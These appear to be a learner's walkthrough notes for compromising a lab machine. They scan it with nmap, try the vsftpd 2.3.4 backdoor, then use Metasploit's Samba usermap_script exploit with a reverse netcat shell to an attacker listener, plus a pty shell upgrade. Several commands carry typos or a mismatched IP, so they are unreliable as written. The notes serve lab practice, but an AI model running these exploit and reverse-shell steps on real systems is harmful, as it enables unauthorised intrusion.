#perform normal name sacn
namp 10.10.10.3

#perform namp to check version of vsftpd
name -sV -p 21 10.10.10.3

#we found that it has version 2.3.4
#use msfconsole to try exploit it 
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.3
run
#exploit result negetive
#check smaba version
nmap -sV -p 139,445 10.129.95.165
#not able to find exact smb version so run following
smbclient -L 10.10.10.3 -N
#found smb version is 3.0.20 which can be exploited using multi/samba/usermap_script in msfconsole

msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set RPORT 139
set LHOST 10.10.14.106
set LPORT 4444
set PAYLOAD cmd/unix/reverse_netcat
run

#in split terminal run 
nc -lvnp 4444
#will see result like this "[*] Command shell session 1 opened" 
#NOTE:you dont see any shell opened in msffconsole but you already got access you can run anycommands if you want fulllfedged terminal of target then run following command(not tested)
python -c 'import pty; pty.spawn("/bin/bash")'

